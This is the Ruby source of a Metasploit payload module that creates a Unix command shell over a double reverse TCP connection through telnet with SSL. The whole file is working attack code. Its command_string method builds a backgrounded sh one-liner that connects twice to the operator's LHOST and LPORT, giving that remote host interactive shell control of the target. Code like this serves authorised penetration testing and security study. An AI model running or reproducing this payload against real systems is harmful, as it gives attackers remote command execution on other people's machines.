##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_double_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcpDoubleSSL'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Double Reverse TCP SSL (telnet)',
      'Description'   => 'Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option',
      'Author'        => [
        'hdm',	# Original module
        'RageLtMan', # SSL support
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'UNIX',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'telnet',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate

    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd =
      "sh -c '(sleep #{3600+rand(1024)}|" +
      "telnet -z #{datastore['LHOST']} #{datastore['LPORT']}|" +
      "while : ; do sh && break; done 2>&1|" +
      "telnet -z #{datastore['LHOST']} #{datastore['LPORT']}" +
      " >/dev/null 2>&1 &)'"
    return cmd
  end

end
